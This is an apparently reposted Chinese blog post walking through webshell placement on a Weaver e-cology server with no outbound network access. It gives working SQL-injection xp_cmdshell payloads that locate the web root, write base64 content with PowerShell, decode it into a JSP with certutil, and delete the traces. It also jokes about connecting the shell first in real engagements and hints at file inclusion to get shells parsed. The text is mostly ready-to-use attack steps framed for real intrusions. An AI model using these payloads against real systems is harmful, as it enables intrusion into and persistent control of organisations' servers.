<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4kplhfrGKoCu1NA7p9wwLQ)

### 0x00 前言

在实际环境中测试过后，发现写入 webshell 并没有想象的那么顺利，本篇文章内容主要为上篇不出网利用部分的补充。

主要有三个问题需要思考：

1. 如何寻找 web 根目录

2. 如何去写入 webshell 文件

3. 如何绕过某微自检查使 webshell 文件被解析

### 0x01 操作步骤

**第一步**

通过环境变量信息获取 resin.jar 的路径

```
echo %CLASSPATH%


```

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQRCHFjGu5ZURReHIoictqliccj7swX2bYNO9019zUGPNqKCdLNHyLyibibe4ib8eolKIjgLM3axMU0RcBQ/640?wx_fmt=png)

**第二步**

通过 resin.jar 的路径，推测出 web 根目录

```
D:\WEAVER\Resin\lib\resin.jar
|
D:\WEAVER\ecology\


```

然后通过 dir 命令去验证推测路径是否存在

```
dir D:\WEAVER\ecology\favicon.ico

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQRCHFjGu5ZURReHIoictqlicciaydKCJj1yiaQYXsJHaYg4vmYuWZmmxibtiac9oku9qmzZOT3EdZ2YCpaA/640?wx_fmt=png)  

**第三步**

到这里就已知 web 根目录了，执行写文件操作无需再回显结果。

使用 powershell 命令向 web 根目录写入 base64 编码的文件内容。

```
<% out.println("vul");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

```

｜

```
'exec master..xp_cmdshell 'powershell Set-Content -Path D:\WEAVER\ecology\64.txt -Value PCUgb3V0LnByaW50bG4oInZ1bCIpO25ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICU+' select'

```

访问验证 txt 文件是否写入成功

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQRCHFjGu5ZURReHIoictqlicc4vo2YVnPiaNiaicS7kPehJRIQ7D0D4oZO54ADgicznQ7fBCbGQW7rJwhPQ/640?wx_fmt=png)

**第四步**

将 base64 内容解码并写入新的 jsp 文件中

```
'exec master..xp_cmdshell 'certutil -decode D:\WEAVER\ecology\64.txt D:\WEAVER\ecology\64.jsp' select'


```

命令执行前后对比图如下

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQRCHFjGu5ZURReHIoictqliccfHNcxOvHxzlYwjKoIWzht4oib0l9kf3TibmUNUqBfu6MKF3ibC2qHcpew/640?wx_fmt=png)

**第五步**

复现后，文中写入的 jsp 测试文件在第一次访问后会自删除，我们手动删除 txt 文件。(实际项目中可以连上 shell 再删哈哈)

```
'exec master..xp_cmdshell 'del D:\WEAVER\ecology\64.txt' select'


```

验证 txt 文件是否删除成功

![](https://mmbiz.qpic.cn/mmbiz_png/TezRTl7qZQRCHFjGu5ZURReHIoictqlicchktvr0fQ5q2tqBC2epDrOjGHSV9YODc7RcYdaEMR4VHh2Tia4Miam20g/640?wx_fmt=png)

### 0x02 结语

1.  整个操作过程中，需要回显两次命令结果，从而确定 web 根目录位置。测试发现第二次执行命令的结果并没有按照预期写入临时表中，大概是因为系统缓存的原因，于是删除临时表后重新新建了另一张临时表去接收新的命令执行结果。
    
2.  由于并没有更多的实际环境数据，暂未确认上述获取 web 根目录的方式是否通用。
    
3.  测试时使用 echo 命令去写入文件，发现并没有执行成功。
    
4.  删除后的 jsp 文件，仍然能够访问到。
    
5.  通常的 webshell 文件，某微是不会去解析的，这是实战中最关键的问题，这里提供一个思路供大家参考，文件包含。